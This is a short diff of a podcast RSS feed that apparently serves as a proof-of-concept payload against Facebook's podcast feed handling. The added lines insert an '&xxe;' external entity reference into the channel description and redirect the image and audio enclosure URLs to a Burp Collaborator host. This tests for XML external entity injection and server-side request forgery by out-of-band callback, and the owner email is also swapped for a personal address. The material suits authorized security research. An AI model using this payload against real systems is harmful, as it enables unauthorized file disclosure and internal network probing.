@@ -5,18 +5,18 @@
      <channel>
        <title>The Facebook Podcast</title>
        <link>https://thefacebook.com/podcast</link>
-       <description>Everyday life of a facebook engineer</description>>
+       <description>&xxe;</description>>
        <language>en</language>
-       <itunes:image href="https://thefacebook.com/podcast/image.png"/>
+       <itunes:image href="https://j8sbomtvbj1kfksnujp0xtwmyd45su.burpcollaborator.net/podcast/image.png"/>
        <itunes:explicit>true</itunes:explicit>
        <itunes:owner>
-       <itunes:email>hexa@thefacebook.com</itunes:email>
+       <itunes:email>ajdumanhug@gmail.com</itunes:email>
        </itunes:owner>
        <item>
          <title>A Legend Is Born</title>
          <description>How to code 10x faster with 10x more bugs</description>
-         <enclosure url="https://thefacebook.com/podcast/episode1.mp3" length="12345" type="audio/mpeg"/>
-         <itunes:image href="https://thefacebook.com/podcast/episode1.png" />
+         <enclosure url="https://j8sbomtvbj1kfksnujp0xtwmyd45su.burpcollaborator.net/podcast/episode1.mp3" length="12345" type="audio/mpeg"/>
+         <itunes:image href="https://j8sbomtvbj1kfksnujp0xtwmyd45su.burpcollaborator.net/podcast/episode1.png" />
          <pubDate>Fri, 06 Apr 1984 00:00:01 GMT</pubDate>
          <guid>684CFFCD-CFA0-FACE-B00C-2F5473246A72</guid>
          <itunes:explicit>true</itunes:explicit>
